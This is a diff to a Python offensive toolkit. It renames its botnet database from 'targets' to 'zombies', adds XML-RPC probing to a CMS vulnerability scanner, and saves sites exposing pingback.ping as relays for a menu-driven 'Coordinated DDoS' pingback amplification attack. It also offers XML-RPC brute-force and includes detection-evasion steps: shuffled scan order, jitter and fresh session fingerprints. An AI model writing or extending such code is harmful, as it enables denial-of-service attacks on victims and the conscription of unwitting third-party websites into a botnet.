@@ -108,7 +108,7 @@ BANNER = rf"""
 
 SEPARATOR = f"{C}{'─' * 60}{RST}"
 
-BOTNET_DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "botnet_targets.json")
+BOTNET_DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "botnet_zombies.json")
 
 # ─── Stealth Mode ─────────────────────────────────────────────────────────────
 
@@ -837,7 +837,7 @@ def pause():
     input(f"\n  {C}Press Enter to continue...{RST}")
 
 
-# ─── Botnet Target DB ────────────────────────────────────────────────────────
+# ─── Botnet Zombie DB ────────────────────────────────────────────────────────
 
 def _botnet_db_load():
     if os.path.exists(BOTNET_DB):
@@ -849,21 +849,21 @@ def _botnet_db_load():
     return []
 
 
-def _botnet_db_save(targets):
+def _botnet_db_save(zombies):
     with open(BOTNET_DB, "w", encoding="utf-8") as f:
-        json.dump(targets, f, indent=2, ensure_ascii=False)
+        json.dump(zombies, f, indent=2, ensure_ascii=False)
 
 
 def _botnet_db_add(url, cms, vectors):
-    targets = _botnet_db_load()
-    for t in targets:
-        if t["url"] == url:
-            t["vectors"] = list(set(t.get("vectors", []) + vectors))
-            t["last_seen"] = datetime.now().isoformat()
-            t["cms"] = cms
-            _botnet_db_save(targets)
+    zombies = _botnet_db_load()
+    for z in zombies:
+        if z["url"] == url:
+            z["vectors"] = list(set(z.get("vectors", []) + vectors))
+            z["last_seen"] = datetime.now().isoformat()
+            z["cms"] = cms
+            _botnet_db_save(zombies)
             return
-    targets.append({
+    zombies.append({
         "url": url,
         "cms": cms,
         "vectors": vectors,
@@ -871,7 +871,7 @@ def _botnet_db_add(url, cms, vectors):
         "added": datetime.now().isoformat(),
         "last_seen": datetime.now().isoformat(),
     })
-    _botnet_db_save(targets)
+    _botnet_db_save(zombies)
 
 
 # ─── 1. Username Search ───────────────────────────────────────────────────────
@@ -4327,6 +4327,7 @@ def cms_vuln_scanner():
             ("/language/en-GB/en-GB.xml", "Language version"),
             ("/plugins/system/cache/cache.xml", "Cache plugin"),
             ("/api/", "API endpoint"),
+            ("/xmlrpc.php", "XML-RPC"),
         ],
         "Drupal": [
             ("/user/login", "Login page"),
@@ -4356,6 +4357,7 @@ def cms_vuln_scanner():
         ("/phpinfo.php", "PHP info"),
         ("/elmah.axd", ".NET error log"),
         ("/web.config", "IIS config"),
+        ("/xmlrpc.php", "XML-RPC"),
     ])
 
     # Shuffle scan order to avoid signature-based detection
@@ -4413,7 +4415,12 @@ def cms_vuln_scanner():
         except Exception:
             pass
 
-        # Check xmlrpc — active verification
+    # ── XML-RPC deep checks (any CMS) ──
+    # Always attempt active XML-RPC verification if xmlrpc.php was found
+    # during path scan, or probe it unconditionally for thoroughness
+    xmlrpc_found = any(f[0] == "/xmlrpc.php" for f in findings)
+    if xmlrpc_found:
+        print(f"\n  {M}── XML-RPC Deep Checks ({cms}) ──{RST}")
         _cms_jitter(1.0, 2.5)
         session.cookies.clear()  # new session fingerprint for XML-RPC phase
         xmlrpc_url = f"{url}/xmlrpc.php"
@@ -4536,15 +4543,13 @@ def cms_vuln_scanner():
                 if high:
                     print(f"    {R}[!] HIGH risk methods:{RST} {', '.join(high)}")
 
-                # ── Save to botnet DB if DDoS vectors found ──
+                # ── Save to botnet DB only if DDoS vector found (not brute-force) ──
                 ddos_vecs = []
-                if "system.multicall" in xmlrpc_methods:
-                    ddos_vecs.append("system.multicall")
                 if "pingback.ping" in xmlrpc_methods:
                     ddos_vecs.append("pingback.ping")
                 if ddos_vecs:
                     _botnet_db_add(url, cms, ddos_vecs)
-                    print(f"    {G}[+]{RST} Target saved to botnet DB → {os.path.basename(BOTNET_DB)}")
+                    print(f"    {G}[+]{RST} Zombie saved to botnet DB → {os.path.basename(BOTNET_DB)}")
 
                 # ── Offer brute-force attack ──
                 print(f"\n    {Y}XML-RPC brute-force vector confirmed.{RST}")
@@ -7701,31 +7706,31 @@ def websocket_flood():
 # ─── Botnet — Coordinated DDoS from Discovered Targets ──────────────────────
 
 def botnet_manager():
-    print_header("Botnet — Coordinated Attack from Discovered Targets")
+    print_header("Botnet — Coordinated DDoS via Zombie Relays")
     if not stress_disclaimer():
         return
 
-    targets = _botnet_db_load()
+    zombies = _botnet_db_load()
 
     while True:
-        print(f"\n  {Y}── Botnet Target Manager ──{RST}")
-        print(f"  {C}Targets in DB:{RST} {W}{len(targets)}{RST}\n")
+        print(f"\n  {Y}── Botnet Zombie Manager ──{RST}")
+        print(f"  {C}Zombies in DB:{RST} {W}{len(zombies)}{RST}\n")
 
-        if targets:
-            for i, t in enumerate(targets, 1):
-                vecs = ", ".join(t.get("vectors", []))
-                added = t.get("added", "?")[:10]
-                print(f"  {C}{i:>3}.{RST} {W}{t['url']}{RST}  [{t.get('cms', '?')}]  "
+        if zombies:
+            for i, z in enumerate(zombies, 1):
+                vecs = ", ".join(z.get("vectors", []))
+                added = z.get("added", "?")[:10]
+                print(f"  {C}{i:>3}.{RST} {W}{z['url']}{RST}  [{z.get('cms', '?')}]  "
                       f"vectors: {R}{vecs}{RST}  added: {added}")
             print()
 
-        ping_targets = [t for t in targets if "pingback.ping" in t.get("vectors", [])]
+        ping_zombies = [z for z in zombies if "pingback.ping" in z.get("vectors", [])]
 
         print(f"  {Y}Options:{RST}")
-        print(f"    {R}1.{RST} XML-RPC Pingback Amplification ({G}{len(ping_targets)}{RST} relays available)")
-        print(f"    {C}2.{RST} Add target manually")
-        print(f"    {C}3.{RST} Remove target")
-        print(f"    {C}4.{RST} Clear all targets")
+        print(f"    {R}1.{RST} XML-RPC Pingback Amplification ({G}{len(ping_zombies)}{RST} relays available)")
+        print(f"    {C}2.{RST} Add zombie manually")
+        print(f"    {C}3.{RST} Remove zombie")
+        print(f"    {C}4.{RST} Clear all zombies")
         print(f"    {C}0.{RST} Back to main menu")
 
         choice = input(f"\n  {Y}Select >{RST} ").strip()
@@ -7733,38 +7738,38 @@ def botnet_manager():
         if choice == "0":
             return
         elif choice == "1":
-            if not ping_targets:
-                print_err("No targets with pingback.ping vector. Run CMS Vuln Scanner (50) first.")
+            if not ping_zombies:
+                print_err("No zombies with pingback.ping vector. Run CMS Vuln Scanner (50) first.")
                 continue
-            _botnet_xmlrpc_amplify(ping_targets)
+            _botnet_xmlrpc_amplify(ping_zombies)
         elif choice == "2":
-            new_url = prompt("Target URL")
+            new_url = prompt("Zombie URL")
             if not new_url:
                 continue
             if not new_url.startswith(("http://", "https://")):
                 new_url = "https://" + new_url
             new_url = new_url.rstrip("/")
             _botnet_db_add(new_url, "Manual", ["pingback.ping"])
-            targets = _botnet_db_load()
-            print(f"  {G}[+]{RST} Target added.")
+            zombies = _botnet_db_load()
+            print(f"  {G}[+]{RST} Zombie added.")
         elif choice == "3":
-            idx = input(f"  {Y}Target number to remove:{RST} ").strip()
+            idx = input(f"  {Y}Zombie number to remove:{RST} ").strip()
             try:
                 idx = int(idx) - 1
-                if 0 <= idx < len(targets):
-                    removed = targets.pop(idx)
-                    _botnet_db_save(targets)
+                if 0 <= idx < len(zombies):
+                    removed = zombies.pop(idx)
+                    _botnet_db_save(zombies)
                     print(f"  {G}[+]{RST} Removed: {removed['url']}")
                 else:
                     print_err("Invalid number.")
             except ValueError:
                 print_err("Enter a valid number.")
         elif choice == "4":
-            confirm = input(f"  {R}Clear ALL targets? (yes/no):{RST} ").strip().lower()
+            confirm = input(f"  {R}Clear ALL zombies? (yes/no):{RST} ").strip().lower()
             if confirm in ("yes", "y"):
-                targets = []
-                _botnet_db_save(targets)
-                print(f"  {G}[+]{RST} All targets cleared.")
+                zombies = []
+                _botnet_db_save(zombies)
+                print(f"  {G}[+]{RST} All zombies cleared.")
         else:
             print_err("Invalid option.")
 
@@ -9361,7 +9366,7 @@ def show_menu():
     print(f"  {Y}╠{'═' * w}╣{RST}")
     ai_txt = "AI Search — Find the best tool for your needs"
     bot_count = len(_botnet_db_load())
-    bot_txt = f"Botnet — Coordinated DDoS ({bot_count} target{'s' if bot_count != 1 else ''})"
+    bot_txt = f"Botnet — Coordinated DDoS ({bot_count} zombie{'s' if bot_count != 1 else ''})"
     print(f"  {Y}║{RST}  {G} A.{RST} {W}{ai_txt:<{w - 6}}{Y}║{RST}")
     print(f"  {Y}║{RST}  {M} S.{RST} {W}{'Stealth Mode Config':<{w - 6}}{Y}║{RST}")
     print(f"  {Y}║{RST}  {R} B.{RST} {W}{bot_txt:<{w - 6}}{Y}║{RST}")
